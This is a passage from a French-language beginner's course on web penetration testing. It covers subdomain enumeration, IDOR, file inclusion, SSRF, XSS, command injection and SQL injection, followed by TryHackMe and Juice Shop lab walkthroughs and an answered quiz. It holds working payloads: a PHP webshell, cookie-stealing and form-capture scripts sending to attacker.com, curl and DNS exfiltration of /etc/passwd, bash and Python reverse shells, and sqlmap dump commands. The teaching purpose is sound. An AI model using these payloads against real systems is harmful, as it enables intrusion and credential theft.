  pip install -r requirements.txt
  python sublist3r.py -d example.com
  ```

- **dnsrecon** : Outil d'énumération DNS complet
  ```bash
  apt-get install dnsrecon
  dnsrecon -d example.com -D /usr/share/wordlists/dnsmap.txt -t brt
  ```

#### Validation des sous-domaines

Après avoir collecté les sous-domaines, il est important de vérifier lesquels sont actifs :

```bash
# Avec massdns
massdns -r /path/to/resolvers.txt -t A -o S -w results.txt subdomains.txt

# Avec httprobe
cat subdomains.txt | httprobe > live-subdomains.txt
```

#### Méthodologie recommandée

1. Commencer par des techniques passives (subfinder, amass en mode passif)
2. Compléter avec du bruteforce ciblé (amass, gobuster dns)
3. Utiliser l'altération de DNS pour découvrir des variations (altdns, dnsgen)
4. Valider les sous-domaines actifs (massdns, httprobe)
5. Prendre des captures d'écran pour analyse visuelle (aquatone, EyeWitness)

**En clair, pour un débutant :**
L'énumération de sous-domaines, c'est comme chercher toutes les annexes d'un bâtiment principal. Si example.com est le bâtiment principal, vous cherchez dev.example.com, admin.example.com, api.example.com, etc. Ces "annexes" sont souvent moins surveillées et peuvent offrir des accès plus faciles au système global. Les outils comme amass et subfinder font ce travail automatiquement en cherchant dans des bases de données publiques et en testant des combinaisons courantes.

### Auth Bypass & IDOR

Les vulnérabilités d'authentification et d'autorisation sont parmi les plus critiques dans les applications web.

#### Contournement d'authentification (Auth Bypass)

Le contournement d'authentification consiste à accéder à des fonctionnalités protégées sans disposer d'identifiants valides.

##### Techniques courantes

1. **Manipulation de paramètres** :
   - Modifier les paramètres comme `admin=false` en `admin=true`
   - Changer `role=user` en `role=admin`
   - Tester `debug=true` ou `test=1`

2. **Défauts de logique** :
   - Accès direct aux pages internes sans authentification
   - Redirection incorrecte après connexion
   - Vérification d'authentification côté client uniquement

3. **Identifiants par défaut ou faibles** :
   - Tester les combinaisons courantes (admin/admin, admin/password)
   - Consulter les documentations pour les identifiants par défaut

4. **Manipulation de cookies** :
   - Modifier les valeurs de cookies d'authentification
   - Tester des jetons JWT avec des algorithmes faibles

##### Exemple pratique

```
# URL originale nécessitant une authentification
https://example.com/admin/dashboard

# Tentatives de contournement
https://example.com/admin/dashboard?admin=true
https://example.com/admin/dashboard?debug=true
https://example.com/admin/dashboard.backup
https://example.com/admin/dashboard#
```

#### IDOR (Insecure Direct Object References)

IDOR est une vulnérabilité où une application expose des références à des objets internes, permettant à un attaquant d'accéder ou de manipuler des données non autorisées.

##### Identification des IDOR

1. **Paramètres numériques** :
   ```
   https://example.com/profile?id=123
   ```
   Tester avec d'autres valeurs : `id=124`, `id=1`, etc.

2. **Identifiants prévisibles** :
   ```
   https://example.com/api/document/d8e8fca2dc0f896fd7cb4cb0031ba249
   ```
   Analyser le format (UUID, hash MD5, incrémental)

3. **Références dans le corps des requêtes** :
   ```json
   {
     "user_id": 123,
     "action": "view_salary"
   }
   ```
   Modifier les valeurs pour accéder à d'autres objets

##### Exploitation avec Burp Intruder

Burp Intruder est parfait pour tester systématiquement les IDOR :

1. **Configuration de base** :
   - Intercepter une requête légitime
   - Envoyer à Intruder (Ctrl+I)
   - Définir les positions (paramètres à tester)
   - Configurer la charge utile (payload)

2. **Types d'attaques** :
   - **Sniper** : Test d'une seule position avec différentes valeurs
   - **Battering ram** : Même valeur à toutes les positions
   - **Pitchfork** : Valeurs correspondantes à chaque position
   - **Cluster bomb** : Toutes les combinaisons possibles

3. **Exemple pratique** :
   ```
   GET /api/user/§123§/profile HTTP/1.1
   Host: example.com
   Cookie: session=abc123
   ```
   
   Payload : Liste de nombres de 1 à 200

4. **Analyse des résultats** :
   - Examiner les différences de longueur de réponse
   - Vérifier les codes de statut
   - Rechercher des informations sensibles dans les réponses

##### Contournement des protections

1. **Changement de méthode HTTP** :
   - Passer de GET à POST ou inversement
   - Essayer PUT, DELETE, etc.

2. **Encodage des paramètres** :
   - URL encoding
   - Double encoding
   - Base64

3. **Modification des en-têtes** :
   - Ajouter/modifier X-Forwarded-For
   - Changer User-Agent
   - Utiliser X-Original-URL

##### Bonnes pratiques de test

1. Créer plusieurs comptes de test pour comparer les accès
2. Documenter toutes les références d'objets identifiées
3. Tester systématiquement chaque fonctionnalité
4. Vérifier les API en plus des interfaces web
5. Tester les opérations CRUD (Create, Read, Update, Delete)

**En clair, pour un débutant :**
Les vulnérabilités Auth Bypass et IDOR sont comme des failles dans un système de contrôle d'accès. L'Auth Bypass, c'est trouver une porte dérobée pour entrer sans badge. L'IDOR, c'est découvrir que si votre casier est le numéro 123, vous pouvez accéder au casier 124 simplement en changeant l'URL. Burp Intruder est l'outil qui teste automatiquement des milliers de combinaisons pour trouver ces failles.

### File Inclusion

Les vulnérabilités d'inclusion de fichiers permettent à un attaquant d'inclure des fichiers locaux ou distants dans l'exécution d'une application web.

#### Local File Inclusion (LFI)

LFI se produit lorsqu'une application inclut un fichier du système local basé sur une entrée utilisateur non validée.

##### Identification des LFI

Recherchez des paramètres qui pourraient inclure des fichiers :
```
https://example.com/index.php?page=about
https://example.com/main?template=default
https://example.com/content?file=welcome
```

##### Exploitation basique

1. **Accès aux fichiers système** :
   ```
   https://example.com/index.php?page=../../../etc/passwd
   https://example.com/index.php?page=/etc/passwd
   ```

2. **Contournement de filtres** :
   ```
   # Double encodage
   https://example.com/index.php?page=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
   
   # Nullbyte (PHP < 5.3.4)
   https://example.com/index.php?page=../../../etc/passwd%00
   
   # Chemin absolu
   https://example.com/index.php?page=/var/www/html/index.php
   
   # Séquences de traversée imbriquées
   https://example.com/index.php?page=....//....//....//etc/passwd
   ```

3. **Wrappers PHP** (si applicable) :
   ```
   # Afficher le code source
   https://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
   
   # Exécution de code
   https://example.com/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2BCg%3D%3D&cmd=id
   ```

4. **Fichiers de logs** :
   ```
   https://example.com/index.php?page=../../../var/log/apache2/access.log
   ```
   Puis empoisonnement du log via User-Agent

#### Remote File Inclusion (RFI)

RFI permet d'inclure des fichiers depuis des serveurs distants, offrant souvent une exécution de code directe.

##### Prérequis pour RFI

- `allow_url_include = On` dans la configuration PHP
- Entrée utilisateur non validée dans les fonctions d'inclusion

##### Exploitation

1. **Inclusion basique** :
   ```
   https://example.com/index.php?page=http://attacker.com/shell.txt
   ```

2. **Hébergement d'une webshell** :
   ```php
   <?php
   system($_GET['cmd']);
   ?>
   ```

3. **Exécution via RFI** :
   ```
   https://example.com/index.php?page=http://attacker.com/shell.txt&cmd=id
   ```

#### Path Traversal

Le Path Traversal (ou Directory Traversal) est similaire au LFI mais se concentre sur l'accès aux fichiers plutôt que sur leur inclusion dans l'exécution.

##### Exemples courants

```
# Accès à des fichiers via des paramètres de téléchargement
https://example.com/download?file=../../../etc/passwd

# Via des chemins d'images
https://example.com/images/../../../etc/passwd

# Dans les en-têtes HTTP
Referer: ../../../etc/passwd
```

##### Contournement de filtres

1. **Encodage URL** :
   ```
   %2e%2e%2f = ../
   ```

2. **Double encodage** :
   ```
   %252e%252e%252f = ../
   ```

3. **Utilisation de caractères non standard** :
   ```
   ..././..././..././etc/passwd
   ```

4. **Contournement de suppression** :
   ```
   # Si "../" est supprimé
   ....//....//....//etc/passwd
   ```

#### Mitigation et prévention

Pour les développeurs, voici comment prévenir ces vulnérabilités :

1. Ne jamais utiliser d'entrée utilisateur pour les inclusions de fichiers
2. Utiliser des listes blanches plutôt que des listes noires
3. Stocker les fichiers inclus hors de la racine web
4. Désactiver `allow_url_include` et `allow_url_fopen` si possible
5. Implémenter une validation stricte des entrées

**En clair, pour un débutant :**
Les vulnérabilités d'inclusion de fichiers sont comme si un site web vous permettait de lire n'importe quel livre de la bibliothèque en modifiant simplement l'URL. Avec LFI, vous pouvez lire des fichiers sur le serveur même (comme les mots de passe système). Avec RFI, vous pouvez faire lire au serveur vos propres "livres" malveillants hébergés ailleurs. Le Path Traversal utilise "../" pour "remonter" dans les dossiers, comme si vous sortiez d'une pièce pour entrer dans une autre normalement inaccessible.

### Intro to SSRF (Server-Side Request Forgery)

Le SSRF (Server-Side Request Forgery) est une vulnérabilité qui permet à un attaquant de forcer le serveur à effectuer des requêtes vers des destinations non prévues.

#### Concept de base

Dans une attaque SSRF, l'attaquant abuse d'une fonctionnalité du serveur qui effectue des requêtes vers d'autres systèmes. L'attaquant manipule ces requêtes pour :
- Accéder à des services internes normalement inaccessibles
- Contourner des restrictions de pare-feu
- Interagir avec des métadonnées cloud
- Scanner des ports internes
- Exécuter des actions non autorisées

#### Identification des vecteurs SSRF

Recherchez les fonctionnalités qui impliquent des requêtes serveur :
- Importation de ressources (images, documents)
- Webhooks et callbacks
- Conversion de documents (HTML → PDF)
- Vérification d'URL
- Proxys et redirections
- Intégrations avec des API externes

#### Exemples de paramètres vulnérables

```
https://example.com/fetch?url=https://api.example.com/data
https://example.com/pdf?site=https://example.com/report
https://example.com/check?address=https://partner.com
https://example.com/proxy?endpoint=https://internal-api/v1/users
```

#### Exploitation simple : récupération de métadonnées cloud

Les plateformes cloud exposent souvent des métadonnées via des endpoints internes :

##### AWS

```
# URL de base des métadonnées AWS
http://169.254.169.254/latest/meta-data/

# Récupération de l'IAM role
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Récupération des clés d'accès
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

##### Azure

```
# URL de base des métadonnées Azure
http://169.254.169.254/metadata/instance

# Avec en-tête requis
Metadata: true
```

##### Google Cloud

```
# URL de base des métadonnées GCP
http://metadata.google.internal/computeMetadata/v1/

# Avec en-tête requis
Metadata-Flavor: Google
```

#### Techniques d'exploitation

1. **Accès aux services internes** :
   ```
   https://example.com/fetch?url=http://localhost:8080/admin
   https://example.com/fetch?url=http://internal-service/api/users
   ```

2. **Scan de ports** :
   ```
   https://example.com/fetch?url=http://localhost:22
   https://example.com/fetch?url=http://localhost:3306
   ```
   Observer les différences de temps de réponse ou d'erreurs

3. **Utilisation de protocoles alternatifs** :
   ```
   https://example.com/fetch?url=file:///etc/passwd
   https://example.com/fetch?url=dict://localhost:11211/info
   ```

#### Contournement des protections

1. **Redirection** :
   Créer un serveur qui redirige vers la cible interne
   ```
   https://example.com/fetch?url=https://attacker.com/redirect
   ```

2. **Encodage d'URL** :
   ```
   https://example.com/fetch?url=http%3A%2F%2Flocalhost%3A8080
   ```

3. **Utilisation d'adresses IP alternatives** :
   ```
   # Représentations alternatives de 127.0.0.1
   http://127.0.0.1
   http://localhost
   http://[::1]
   http://2130706433 (décimal)
   http://0x7f000001 (hexadécimal)
   ```

#### Outils pour tester le SSRF

- **Burp Collaborator** : Détecte les connexions sortantes
- **SSRF Sheriff** : Framework de test SSRF
- **Gopherus** : Outil pour générer des payloads Gopher

#### Exemple pratique : test simple

1. Configurez un serveur web accessible publiquement qui enregistre les requêtes
2. Injectez l'URL de ce serveur dans les paramètres potentiellement vulnérables
3. Vérifiez si votre serveur reçoit des requêtes du serveur cible
4. Analysez les en-têtes et le contenu des requêtes pour comprendre le contexte

**En clair, pour un débutant :**
Le SSRF, c'est comme si vous demandiez à un employé d'une entreprise d'aller chercher un document pour vous, mais au lieu de lui donner l'adresse du document légitime, vous lui donnez l'adresse d'un serveur interne normalement inaccessible de l'extérieur. L'employé (le serveur web) utilise son badge d'accès pour récupérer des informations auxquelles vous n'auriez pas dû avoir accès. Les métadonnées cloud sont particulièrement intéressantes car elles peuvent contenir des clés d'accès et autres informations sensibles.

### Intro to XSS (Cross-Site Scripting)

Le Cross-Site Scripting (XSS) est une vulnérabilité qui permet à un attaquant d'injecter du code JavaScript malveillant dans une page web, qui sera ensuite exécuté dans le navigateur des visiteurs.

#### Types de XSS

##### Reflected XSS (XSS réfléchi)

Le XSS réfléchi se produit lorsque l'application renvoie immédiatement l'entrée utilisateur dans la réponse.

**Exemple** :
```
https://example.com/search?q=test
```

Si le site affiche "Résultats pour: test" sans échapper correctement l'entrée, on peut injecter :
```
https://example.com/search?q=<script>alert('XSS')</script>
```

**Caractéristiques** :
- Non persistant (une seule requête)
- Nécessite que la victime clique sur un lien malveillant
- Souvent trouvé dans les formulaires de recherche, messages d'erreur, redirections

##### Stored XSS (XSS stocké)

Le XSS stocké se produit lorsque l'entrée malveillante est stockée dans la base de données et affichée à chaque visiteur ultérieur.

**Exemple** : Commentaire sur un blog
```html
Excellent article !<script>document.location='https://attacker.com/steal.php?cookie='+document.cookie</script>
```

**Caractéristiques** :
- Persistant (affecte tous les visiteurs)
- Plus dangereux car ne nécessite pas d'action spécifique de la victime
- Souvent trouvé dans les forums, commentaires, profils utilisateurs

#### Vecteurs d'injection courants

Les XSS ne se limitent pas aux balises `<script>`. Voici d'autres vecteurs :

1. **Attributs d'événements** :
   ```html
   <img src="x" onerror="alert(1)">
   <body onload="alert(1)">
   ```

2. **Balises avec JavaScript** :
   ```html
   <img src="javascript:alert(1)">
   <iframe src="javascript:alert(1)">
   ```

3. **CSS avec JavaScript** :
   ```html
   <div style="background-image: url('javascript:alert(1)')">
   <style>@import 'javascript:alert(1)'</style>
   ```

4. **Encodages alternatifs** :
   ```html
   <script>eval(atob('YWxlcnQoMSk='))</script>
   <script>\u0061\u006c\u0065\u0072\u0074(1)</script>
   ```

#### Identification des vulnérabilités XSS

1. **Test manuel** :
   - Injecter des marqueurs simples comme `<test>` ou `'">` dans tous les champs
   - Vérifier si ces marqueurs apparaissent non échappés dans la réponse
   - Tester des payloads plus complexes si les marqueurs passent

2. **Utilisation de Burp Suite** :
   - Activer le scanner passif pour détecter les réflexions potentielles
   - Utiliser l'extension "XSS Validator"
   - Tester systématiquement avec Intruder

#### Exploitation basique

1. **Vol de cookies** :
   ```javascript
   <script>
   fetch('https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie))
   </script>
   ```

2. **Capture de données de formulaire** :
   ```javascript
   <script>
   document.querySelector('form').addEventListener('submit', function(e) {
     fetch('https://attacker.com/steal', {
       method: 'POST',
       body: new FormData(this)
     });
   });
   </script>
   ```

3. **Redirection** :
   ```javascript
   <script>
   window.location = 'https://evil-phishing-clone.com';
   </script>
   ```

4. **Défacement** :
   ```javascript
   <script>
   document.body.innerHTML = '<h1>Site piraté</h1>';
   </script>
   ```

#### Contournement des protections

1. **Contournement de filtres basiques** :
   ```html
   <scr<script>ipt>alert(1)</scr</script>ipt>
   <script>al\u0065rt(1)</script>
   <img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
   ```

2. **Contournement de WAF** :
   ```html
   <svg/onload=alert(1)>
   <details open ontoggle=alert(1)>
   ```

3. **Contextes spéciaux** :
   - Dans un attribut : `" onmouseover="alert(1)`
   - Dans un script : `'; alert(1); //`
   - Dans du JSON : `{"key":"value","xss":"</script><script>alert(1)</script>"}`

#### Outils de détection

- **XSStrike** : Framework avancé pour la détection et l'exploitation de XSS
- **XSS Hunter** : Service pour détecter les XSS aveugles
- **DalFox** : Outil de fuzzing XSS paramétrable

**En clair, pour un débutant :**
Le XSS, c'est comme glisser un bout de code malveillant dans une page web légitime. Quand d'autres utilisateurs visitent cette page, leur navigateur exécute ce code sans se méfier, car il semble provenir du site de confiance. Le XSS réfléchi est temporaire et nécessite que la victime clique sur un lien piégé, tandis que le XSS stocké est permanent et affecte tous les visiteurs. C'est comme la différence entre poser un piège temporaire et empoisonner une source d'eau que tout le monde utilise.

### Command Injection

L'injection de commandes est une vulnérabilité qui permet à un attaquant d'exécuter des commandes système arbitraires sur le serveur hébergeant l'application.

#### Fonctionnement

Cette vulnérabilité se produit lorsqu'une application passe des données non validées à un shell système. Par exemple, une application qui ping une adresse IP fournie par l'utilisateur :

```php
<?php
// Vulnérable
system("ping -c 4 " . $_GET['ip']);
?>
```

#### Identification des points d'injection

Recherchez les fonctionnalités qui pourraient interagir avec le système :
- Outils réseau (ping, traceroute, nslookup)
- Recherche de fichiers (find, grep)
- Manipulation d'images (ImageMagick, convert)
- Génération de PDF
- Fonctions d'importation/exportation

#### Caractères spéciaux pour l'injection

Ces caractères permettent d'enchaîner des commandes :

| Caractère | Description | Exemple |
|-----------|-------------|---------|
| `;` | Séparateur de commandes | `ping 127.0.0.1; id` |
| `\|` | Pipe (redirection) | `ping 127.0.0.1 \| id` |
| `&&` | AND logique | `ping 127.0.0.1 && id` |
| `\|\|` | OR logique | `ping 127.0.0.1 \|\| id` |
| `$(...)` | Substitution de commande | `ping $(id)` |
| `` `...` `` | Substitution de commande (ancien) | ``ping `id` `` |
| `&` | Exécution en arrière-plan | `ping 127.0.0.1& id` |
| `$(())` | Évaluation arithmétique | `$(($(id)))` |

#### Techniques d'exploitation

1. **Injection basique** :
   ```
   # Paramètre original
   ip=127.0.0.1
   
   # Injection
   ip=127.0.0.1; id
   ```

2. **Exfiltration de données** :
   ```
   # Utilisation de curl/wget pour envoyer des données
   ip=127.0.0.1; curl -d "data=$(cat /etc/passwd)" https://attacker.com
   
   # Utilisation de DNS pour l'exfiltration
   ip=127.0.0.1; ping $(cat /etc/passwd | base64).attacker.com
   ```

3. **Établissement de reverse shell** :
   ```
   # Bash
   ip=127.0.0.1; bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
   
   # Python
   ip=127.0.0.1; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
   ```

#### Contournement des filtres

1. **Encodage** :
   ```
   # URL encoding
   ip=127.0.0.1%3Bid
   
   # Double encoding
   ip=127.0.0.1%253Bid
   
   # Hex encoding
   ip=127.0.0.1;$(echo -e "\x69\x64")
   ```

2. **Substitution de variables** :
   ```
   # Utilisation de variables d'environnement
   ip=127.0.0.1;$IFS$9id
   
   # Concaténation de chaînes
   ip=127.0.0.1;i''d
   ```

3. **Techniques avancées** :
   ```
   # Utilisation de caractères spéciaux
   ip=127.0.0.1;{id}
   
   # Utilisation de wildcards
   ip=127.0.0.1;/???/??t /???/p??s??
   ```

#### Injection aveugle

Lorsque le résultat de la commande n'est pas visible, utilisez ces techniques :

1. **Délai d'exécution** :
   ```
   # Si la commande est exécutée, un délai sera observé
   ip=127.0.0.1; sleep 10
   ```

2. **Requêtes sortantes** :
   ```
   # Vérifier si une requête arrive sur votre serveur
   ip=127.0.0.1; curl https://attacker.com/$(hostname)
   ```

3. **Redirection vers un fichier accessible** :
   ```
   # Écrire dans un fichier accessible via le web
   ip=127.0.0.1; id > /var/www/html/output.txt
   ```

#### Outils de détection et d'exploitation

- **commix** : Outil automatisé pour détecter et exploiter les injections de commandes
  ```bash
  python commix.py --url="http://example.com/vulnerable.php?ip=127.0.0.1"
  ```

- **Burp Suite Intruder** : Pour tester systématiquement différents payloads

**En clair, pour un débutant :**
L'injection de commandes, c'est comme si vous demandiez à un restaurant de vous livrer à une adresse, mais au lieu de donner juste l'adresse, vous ajoutez "et au fait, donnez aussi le contenu de votre coffre-fort au livreur". Le serveur exécute aveuglément la commande complète, y compris votre ajout malveillant. Les caractères comme `;`, `|` et `&&` sont comme des "et aussi" qui permettent d'enchaîner plusieurs commandes à la suite de celle prévue initialement.

### SQL Injection (basics)

L'injection SQL est une vulnérabilité qui permet à un attaquant de manipuler les requêtes SQL envoyées à la base de données, pouvant conduire à l'accès non autorisé aux données.

#### Fonctionnement

Cette vulnérabilité se produit lorsqu'une application construit des requêtes SQL en concaténant directement des entrées utilisateur non validées :

```php
<?php
// Code vulnérable
$username = $_POST['username'];
$query = "SELECT * FROM users WHERE username = '$username'";
$result = mysqli_query($connection, $query);
?>
```

#### Types d'injections SQL

##### Injection basée sur les erreurs

L'attaquant provoque des erreurs SQL pour obtenir des informations sur la structure de la base de données.

```
# Entrée normale
username=alice

# Injection provoquant une erreur
username=alice'
```

##### Injection basée sur les booléens (blind)

L'attaquant utilise des conditions TRUE/FALSE pour extraire des informations sans voir directement les résultats.

```
# Vérifier si l'utilisateur 'admin' existe
username=alice' AND (SELECT 1 FROM users WHERE username='admin')='1
```

##### Injection basée sur le temps (time-based blind)

L'attaquant utilise des fonctions de délai pour extraire des informations en observant le temps de réponse.

```
# Si le premier caractère du mot de passe admin est 'a', attendre 5 secondes
username=alice' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(5),0)='0
```

##### Injection UNION

L'attaquant utilise l'opérateur UNION pour combiner le résultat de la requête originale avec une autre requête.

```
# Récupérer les noms d'utilisateurs et mots de passe
username=alice' UNION SELECT username, password FROM users -- 
```

#### Détection des vulnérabilités

1. **Test de caractères spéciaux** :
   ```
   ' " ; -- # )
   ```

2. **Vérification des erreurs** :
   - Erreurs SQL exposées
   - Changements dans le comportement de l'application

3. **Tests booléens** :
   ```
   # Condition vraie (comportement normal)
   username=alice' AND 1=1 -- 
   
   # Condition fausse (comportement différent)
   username=alice' AND 1=2 -- 
   ```

#### Exploitation basique

##### 1. Déterminer le nombre de colonnes (pour UNION)

```
# Méthode ORDER BY
username=alice' ORDER BY 1 -- 
username=alice' ORDER BY 2 -- 
username=alice' ORDER BY 3 -- 
# Continuer jusqu'à obtenir une erreur

# Méthode UNION
username=alice' UNION SELECT NULL -- 
username=alice' UNION SELECT NULL, NULL -- 
# Continuer jusqu'à ce que la requête fonctionne
```

##### 2. Identifier les colonnes affichables

```
username=alice' UNION SELECT 'a', 'b', 'c' -- 
```

##### 3. Récupérer des informations sur la base de données

```
# Version de la base de données
username=alice' UNION SELECT 1, @@version -- 

# Nom de la base de données courante
username=alice' UNION SELECT 1, database() -- 

# Liste des tables
username=alice' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database() -- 

# Liste des colonnes d'une table
username=alice' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users' -- 
```

##### 4. Extraire des données

```
# Récupérer les noms d'utilisateurs
username=alice' UNION SELECT 1, username FROM users -- 

# Récupérer les mots de passe
username=alice' UNION SELECT 1, password FROM users -- 

# Récupérer plusieurs colonnes
username=alice' UNION SELECT username, password FROM users -- 
```

#### Commandes SQL utiles par SGBD

##### MySQL

```sql
-- Version
SELECT @@version

-- Base de données courante
SELECT database()

-- Lister les bases de données
SELECT schema_name FROM information_schema.schemata

-- Lister les tables
SELECT table_name FROM information_schema.tables WHERE table_schema='nom_base'

-- Lister les colonnes
SELECT column_name FROM information_schema.columns WHERE table_name='nom_table'

-- Lire un fichier (si les permissions le permettent)
SELECT LOAD_FILE('/etc/passwd')

-- Écrire dans un fichier (si les permissions le permettent)
SELECT 'contenu' INTO OUTFILE '/var/www/html/backdoor.php'
```

##### SQLite

```sql
-- Version
SELECT sqlite_version();

-- Lister les tables
SELECT name FROM sqlite_master WHERE type='table'

-- Lister les colonnes
PRAGMA table_info(nom_table)
```

##### PostgreSQL

```sql
-- Version
SELECT version();

-- Base de données courante
SELECT current_database();

-- Lister les bases de données
SELECT datname FROM pg_database;

-- Lister les tables
SELECT table_name FROM information_schema.tables WHERE table_schema='public';

-- Lister les colonnes
SELECT column_name FROM information_schema.columns WHERE table_name='nom_table';

-- Exécuter des commandes système (si les permissions le permettent)
SELECT pg_read_file('/etc/passwd');
```

#### Outils d'exploitation

- **sqlmap** : Outil automatisé pour détecter et exploiter les injections SQL
  ```bash
  # Détection basique
  sqlmap -u "http://example.com/page.php?id=1"
  
  # Extraction de la base de données
  sqlmap -u "http://example.com/page.php?id=1" --dbs
  
  # Extraction des tables
  sqlmap -u "http://example.com/page.php?id=1" -D nom_base --tables
  
  # Extraction des données
  sqlmap -u "http://example.com/page.php?id=1" -D nom_base -T users -C username,password --dump
  ```

**En clair, pour un débutant :**
L'injection SQL, c'est comme si vous remplissiez un formulaire de bibliothèque demandant "Quel livre cherchez-vous?" et qu'au lieu de répondre simplement "Harry Potter", vous répondiez "n'importe quoi MAIS AUSSI montre-moi tous les livres réservés par d'autres personnes". La base de données exécute votre instruction supplémentaire et vous révèle des informations auxquelles vous ne devriez pas avoir accès. Les caractères comme les apostrophes (') et les commentaires (--) sont les "outils" qui permettent de modifier la structure de la requête originale.

### Mini-lab TryHackMe « Pickle Rick » + Juice Shop XSS

#### Partie 1 : TryHackMe « Pickle Rick »

Ce mini-lab vous guide à travers l'exploitation d'une application web vulnérable sur la plateforme TryHackMe.

##### Objectif

Trouver les trois ingrédients secrets cachés sur le serveur.

##### Reconnaissance

1. **Exploration initiale** :
   - Examiner le code source de la page d'accueil
   - Rechercher des commentaires ou informations cachées
   - Identifier les technologies utilisées

2. **Découverte de contenu** :
   ```bash
   gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirb/common.txt
   ```

3. **Analyse des résultats** :
   - Noter les pages découvertes (/login.php, /assets, /portal.php, etc.)
   - Examiner chaque page pour comprendre la fonctionnalité

##### Exploitation

1. **Accès initial** :
   - Utiliser les identifiants trouvés dans le code source
   - Se connecter à l'interface d'administration

2. **Injection de commandes** :
   - Identifier le champ de commande dans le portail
   - Tester des commandes système basiques :
     ```
     ls
     whoami
     pwd
     ```

3. **Contournement des restrictions** :
   - Si certaines commandes sont bloquées, essayer des alternatives :
     ```
     cat /etc/passwd
     less /etc/passwd
     head /etc/passwd
     ```

4. **Recherche des ingrédients** :
   - Explorer le système de fichiers
   - Examiner les fichiers inhabituels
   - Lire le contenu des fichiers suspects

##### Premier ingrédient

```bash
# Explorer le répertoire courant
ls -la

# Lire le fichier contenant le premier ingrédient
cat Sup3rS3cretPickl3Ingred.txt
```

##### Deuxième ingrédient

```bash
# Explorer le répertoire personnel
ls -la /home/rick

# Lire le fichier contenant le deuxième ingrédient
cat /home/rick/second_ingredients.txt
```

##### Troisième ingrédient

```bash
# Vérifier les privilèges sudo
sudo -l

# Utiliser sudo pour lire le dernier ingrédient
sudo cat /root/3rd.txt
```

#### Partie 2 : OWASP Juice Shop XSS

Cette partie du lab se concentre sur l'exploitation des vulnérabilités XSS dans l'application OWASP Juice Shop.

##### Préparation

1. **Accès à Juice Shop** :
   ```bash
   docker run -d -p 3000:3000 bkimminich/juice-shop
   ```

2. **Exploration de l'application** :
   - Créer un compte utilisateur
   - Explorer les différentes fonctionnalités
   - Identifier les points d'entrée potentiels pour XSS

##### XSS Réfléchi dans la recherche

1. **Test initial** :
   - Accéder à la fonction de recherche
   - Entrer un payload simple :
     ```
     <script>alert('XSS')</script>
     ```
   - Observer si l'alerte s'affiche

2. **Exploitation** :
   - Si le test initial échoue, essayer des variantes :
     ```
     <img src="x" onerror="alert('XSS')">
     <iframe src="javascript:alert('XSS')">
     ```

##### XSS Stocké dans les commentaires

1. **Identification de la cible** :
   - Trouver un produit avec des avis/commentaires
   - Examiner le formulaire de commentaire

2. **Injection du payload** :
   - Soumettre un commentaire contenant du code JavaScript :
     ```
     Excellent produit !<script>alert(document.cookie)</script>
     ```

3. **Vérification** :
   - Recharger la page du produit
   - Observer si l'alerte s'affiche automatiquement

##### XSS dans le profil utilisateur

1. **Modification du profil** :
   - Accéder aux paramètres du profil
   - Identifier les champs modifiables (nom, photo de profil, etc.)

2. **Injection dans le nom d'utilisateur** :
   - Essayer de changer le nom pour inclure du JavaScript :
     ```
     User<script>alert('XSS')</script>
     ```

3. **Vérification** :
   - Observer si le code est exécuté lorsque le profil est affiché

##### Exploitation avancée : vol de cookie

1. **Préparation du serveur de collecte** :
   ```bash
   # Sur votre machine d'attaque
   nc -lvp 8888
   ```

2. **Payload pour exfiltration** :
   ```javascript
   <script>
   fetch('http://VOTRE_IP:8888/cookie=' + encodeURIComponent(document.cookie))
   </script>
   ```

3. **Injection et attente** :
   - Injecter le payload dans un vecteur XSS stocké
   - Attendre que d'autres utilisateurs (ou administrateurs) visitent la page

**En clair, pour un débutant :**
Ces mini-labs sont comme des parcours d'obstacles conçus pour pratiquer vos compétences. Dans Pickle Rick, vous explorez un serveur mal sécurisé en utilisant l'injection de commandes pour trouver des "ingrédients" cachés. Dans Juice Shop, vous injectez du code JavaScript dans différentes parties de l'application pour démontrer comment un attaquant pourrait exécuter du code malveillant dans le navigateur des utilisateurs. Ces exercices pratiques renforcent votre compréhension des vulnérabilités web dans un environnement contrôlé et légal.

### Quiz Intermédiaire

1. **Quel outil est particulièrement efficace pour l'énumération de sous-domaines en utilisant diverses sources publiques ?**
   - A) dirsearch
   - B) amass
   - C) gobuster
   - D) ffuf
   
   *Réponse : B) amass*

2. **Quelle vulnérabilité permet à un attaquant d'accéder aux données d'autres utilisateurs en modifiant simplement un identifiant dans l'URL ?**
   - A) XSS
   - B) CSRF
   - C) IDOR
   - D) SQLi
   
   *Réponse : C) IDOR*

3. **Quel caractère est couramment utilisé pour enchaîner des commandes dans une injection de commandes sous Linux ?**
   - A) `&`
   - B) `;`
   - C) `:`
   - D) `@`
   
   *Réponse : B) ;*

4. **Quelle technique d'injection SQL permet d'extraire des données même si les résultats de la requête ne sont pas affichés à l'écran ?**
   - A) UNION injection
   - B) Error-based injection
   - C) Blind injection
   - D) Stacked queries
   
   *Réponse : C) Blind injection*

5. **Quelle adresse IP est couramment utilisée pour accéder aux métadonnées dans les environnements cloud AWS ?**
   - A) 127.0.0.1
   - B) 192.168.1.1
   - C) 10.0.0.1
   - D) 169.254.169.254
   
   *Réponse : D) 169.254.169.254*
## PARTIE C — Niveau Avancé 1 : Burp Suite & OWASP Fundamentals

### Burp Suite – Utilisation avancée

Burp Suite est l'outil de référence pour le pentesting web. Nous allons explorer ses fonctionnalités avancées pour maximiser son potentiel.

#### Configuration avancée

##### Projet et options

Pour des tests approfondis, configurez un projet Burp :
- **Projet** > **Nouveau projet** > **Projet temporaire** ou **Projet sur disque**
- **Options utilisateur** : Paramètres spécifiques à l'utilisateur
